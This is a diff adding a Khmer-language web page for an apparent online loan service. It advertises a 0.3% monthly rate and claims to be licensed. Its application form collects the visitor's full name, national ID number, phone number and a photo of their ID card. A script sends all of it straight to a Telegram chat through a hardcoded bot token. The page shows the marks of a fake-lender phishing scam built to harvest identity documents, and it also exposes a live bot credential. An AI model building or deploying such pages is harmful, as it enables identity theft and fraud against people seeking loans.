@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="km">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>loan_system</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- របារម៉ឺនុយ -->
+    <nav>
+        <a onclick="showPage('home')" id="nav-home" class="active">ទំព័រដើម</a>
+        <a onclick="showPage('calculator')" id="nav-calculator" >គណនាប្រាក់កម្ចី</a>
+        <a onclick="showPage('apply')" id="nav-apply">ដាក់ពាក្យស្នើសុំ</a>
+        <a onclick="showPage('details')" id="nav-details">ព័ត៌មានលម្អិត</a>
+        <a onclick="showPage('licenses')" id="nav-licenses">អាជ្ញាប័ណ្ណ</a>
+    </nav>
+
+    <div class="container">
+        
+        <!-- 1 Home -->
+        <div id="home" class="page active">
+            <h1>ស្វាគមន៍មកកាន់សេវាកម្មកម្ចីប្រាក់អនឡាញ</h1>
+            <p style="text-align: center; font-size: 18px;">ទទួលបានប្រាក់កម្ចីរហ័ស ងាយស្រួល និងមានសុវត្ថិភាពខ្ពស់ ជាមួយអត្រាការប្រាក់ទាបបំផុតត្រឹមតែ <strong>0.3%</strong> ក្នុងមួយខែ!</p>
+            <div style="text-align: center; margin-top: 30px;">
+                <img src="/img/Gemini_Generated_Image_i2nzvwi2nzvwi2nz.jpg" alt="Banner" style="width: 100%; border-radius: 10px;">
+                <br><br>
+                <button onclick="showPage('apply')" style="width: auto; padding: 15px 30px; font-size: 18px;">ដាក់ពាក្យស្នើសុំឥឡូវនេះ</button>
+            </div>
+        </div>
+
+        <!--  calculator -->
+        <div id="calculator" class="page">
+            <h2>គណនាប្រាក់កម្ចី (អត្រាការប្រាក់ 0.3% / ខែ)</h2>
+            <div class="form-group">
+                <label>ទឹកប្រាក់ដែលចង់ខ្ចី ($):</label>
+                <input type="number" id="calc-amount" placeholder="ឧទាហរណ៍៖ 1000">
+            </div>
+            <div class="form-group">
+                <label>ចំនួនខែដែលត្រូវបង់សង:</label>
+                <input type="number" id="calc-months" placeholder="ឧទាហរណ៍៖ 12">
+            </div>
+            <button onclick="calculateLoan()">គណនា</button>
+
+            <div id="calc-result" class="result-box" style="display: none;">
+                <p>ទឹកប្រាក់ស្នើសុំ៖ <span id="res-amount" class="highlight">0$</span></p>
+                <p>ការប្រាក់សរុប (0.3% x ចំនួនខែ)៖ <span id="res-interest" class="highlight">0$</span></p>
+                <hr>
+                <p>ប្រាក់សរុបដែលត្រូវបង់សងត្រឡប់មកវិញ៖ <strong id="res-total" class="highlight" style="font-size: 22px;">0$</strong></p>
+            </div>
+        </div>
+
+        <!-- apply -->
+        <div id="apply" class="page">
+            <h2>ពាក្យស្នើសុំកម្ចីប្រាក់</h2>
+                <form id="loanForm" onsubmit="submitApplication(event)">
+                    <div class="form-group">
+                        <label>ឈ្មោះពេញ:</label>
+                        <input type="text" id="fullName" required placeholder="បញ្ចូលឈ្មោះពេញរបស់អ្នក">
+                    </div>
+                    <div class="form-group">
+                        <label>លេខអត្តសញ្ញាណប័ណ្ណ:</label>
+                        <input type="text" id="idCardNumber" required placeholder="បញ្ចូលលេខអត្តសញ្ញាណប័ណ្ណ">
+                    </div>
+                    <div class="form-group">
+                        <label>លេខទូរសព្ទ:</label>
+                        <input type="tel" id="phoneNumber" required placeholder="ឧទាហរណ៍៖ 012 345 678">
+                    </div>
+                    <div class="form-group">
+                        <label>ទំហំប្រាក់ចង់ស្នើសុំ ($):</label>
+                        <input type="number" id="loanAmount" required placeholder="បញ្ចូលចំនួនទឹកប្រាក់">
+                    </div>
+                    <div class="form-group">
+                        <label>គោលបំណងនៃការស្នើសុំ:</label>
+                        <textarea id="purpose" rows="3" required placeholder="តើអ្នកខ្ចីប្រាក់សម្រាប់ធ្វើអ្វី?"></textarea>
+                    </div>
+                    <div class="form-group">
+                        <label>ថតអត្តសញ្ញាណប័ណ្ណ:</label>
+                        <input type="file" id="idCardPhoto" accept="image/*" required style="padding: 5px;">
+                    </div>
+                    <button type="submit">បញ្ជូនពាក្យស្នើសុំ</button>
+                </form>
+        </div>
+
+        <!-- datails -->
+        <div id="details" class="page">
+            <h2>ព័ត៌មានលម្អិត និងលក្ខខណ្ឌ</h2>
+            <ul>
+                <li><strong>អត្រាការប្រាក់៖</strong> កំណត់ត្រឹម 0.3% ក្នុងមួយខែថេរ។</li>
+                <li><strong>ឯកសារតម្រូវ៖</strong> អត្តសញ្ញាណប័ណ្ណសញ្ជាតិខ្មែរ (ច្បាប់ដើមសម្រាប់ថតរូបបញ្ជាក់)។</li>
+                <li><strong>រយៈពេលអនុម័ត៖</strong> ពាក្យស្នើសុំរបស់អ្នកនឹងត្រូវបានពិនិត្យ និងអនុម័តក្នុងរយៈពេល ២៤ ម៉ោង។</li>
+                <li><strong>របៀបបង់ប្រាក់៖</strong> អ្នកអាចបង់សងត្រឡប់តាមរយៈធនាគារក្នុងស្រុក (ABA, ACLEDA, Wing)។</li>
+                <li><strong>ការសម្ងាត់៖</strong> ព័ត៌មានផ្ទាល់ខ្លួនរបស់អ្នកនឹងត្រូវបានរក្សាទុកជាការសម្ងាត់១០០% ស្របតាមច្បាប់។</li>
+            </ul>
+        </div>
+
+        <!-- licenses -->
+        <div id="licenses" class="page">
+            <h2>អាជ្ញាប័ណ្ណស្របច្បាប់របស់យើង</h2>
+            <p style="text-align: center;">យើងប្រតិបត្តិការដោយស្របច្បាប់ និងទទួលបានអាជ្ញាប័ណ្ណទទួលស្គាល់ត្រឹមត្រូវពីស្ថាប័នពាក់ព័ន្ធ។</p>
+            <div class="gallery">
+                <img src="/img/1- Bamboo Head Office.jpg" alt="អាជ្ញាប័ណ្ណ 1">
+                <img src="/img/AS(1).jpg" alt="អាជ្ញាប័ណ្ណ 2">
+            </div>
+        </div>
+
+    </div>
+
+    <!-- JavaScript -->
+    <script>
+        // Tab Switching
+        function showPage(pageId) {
+            let pages = document.querySelectorAll('.page');
+            pages.forEach(page => page.classList.remove('active'));
+
+            let links = document.querySelectorAll('nav a');
+            links.forEach(link => link.classList.remove('active'));
+
+            document.getElementById(pageId).classList.add('active');
+            document.getElementById('nav-' + pageId).classList.add('active');
+        }
+
+        function calculateLoan() {
+            let amountInput = document.getElementById('calc-amount').value;
+            let monthsInput = document.getElementById('calc-months').value;
+
+            let amount = parseFloat(amountInput);
+            let months = parseInt(monthsInput);
+
+            if (isNaN(amount) || amount <= 0 || isNaN(months) || months <= 0) {
+                alert("សូមបញ្ចូលចំនួនទឹកប្រាក់ និងចំនួនខែឲ្យបានត្រឹមត្រូវ!");
+                return;
+            }
+
+            let interestRate = 0.003;
+            let totalInterest = amount * interestRate * months;
+            let totalPayment = amount + totalInterest;
+
+            
+            document.getElementById('res-amount').innerText = amount.toFixed(2) + " $";
+            document.getElementById('res-interest').innerText = totalInterest.toFixed(2) + " $";
+            document.getElementById('res-total').innerText = totalPayment.toFixed(2) + " $";
+            
+            document.getElementById('calc-result').style.display = 'block';
+        }
+
+
+        //Telegram
+        async function submitApplication(event) {
+            event.preventDefault(); 
+
+            const BOT_TOKEN = "8883912429:AAHYzlVQsdcqOSo7iONyNdQ8TkdLFlKk33k"; 
+            const CHAT_ID = "-1003577077809"; 
+
+            let fullName = document.getElementById('fullName').value;
+            let idCardNumber = document.getElementById('idCardNumber').value;
+            let phoneNumber = document.getElementById('phoneNumber').value;
+            let loanAmount = document.getElementById('loanAmount').value;
+            let purpose = document.getElementById('purpose').value;
+            let photoFile = document.getElementById('idCardPhoto').files[0];
+
+            let message = `🔔 <b>មានពាក្យស្នើសុំកម្ចីថ្មី!</b>\n\n`;
+            message += `👤 <b>ឈ្មោះពេញ:</b> ${fullName}\n`;
+            message += `🪪 <b>លេខអត្តសញ្ញាណប័ណ្ណ:</b> ${idCardNumber}\n`;
+            message += `📱 <b>លេខទូរសព្ទ:</b> ${phoneNumber}\n`;
+            message += `💰 <b>ទំហំប្រាក់ស្នើសុំ:</b> ${loanAmount} $\n`;
+            message += `📝 <b>គោលបំណង:</b> ${purpose}`;
+
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", photoFile); 
+            formData.append("caption", message); 
+            formData.append("parse_mode", "HTML"); 
+
+            try {
+
+                let submitBtn = event.target.querySelector('button[type="submit"]');
+                submitBtn.innerText = "កំពុងផ្ញើទៅ Telegram...";
+                submitBtn.disabled = true;
+
+                let response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (response.ok) {
+                    alert("ពាក្យស្នើសុំរបស់អ្នកត្រូវបានផ្ញើទៅក្រុមហ៊ុនដោយជោគជ័យ! យើងនឹងទាក់ទងទៅអ្នកឆាប់ៗ។ 🎉");
+                    event.target.reset(); 
+                    showPage('home'); 
+                } else {
+                    let errorData = await response.json();
+                    console.error("Telegram Error:", errorData);
+                    alert("មានបញ្ហាក្នុងការផ្ញើ! សូមពិនិត្យមើល Token ឬ Chat ID ឡើងវិញ។");
+                }
+            } catch (error) {
+                alert("មិនអាចតភ្ជាប់ទៅកាន់ប្រព័ន្ធបានទេ! សូមពិនិត្យអ៊ីនធឺណិតរបស់អ្នក។");
+                console.error(error);
+            } finally {
+
+                let submitBtn = event.target.querySelector('button[type="submit"]');
+                submitBtn.innerText = "បញ្ជូនពាក្យស្នើសុំ";
+                submitBtn.disabled = false;
+            }
+}
+    </script>
+</body>
+</html>
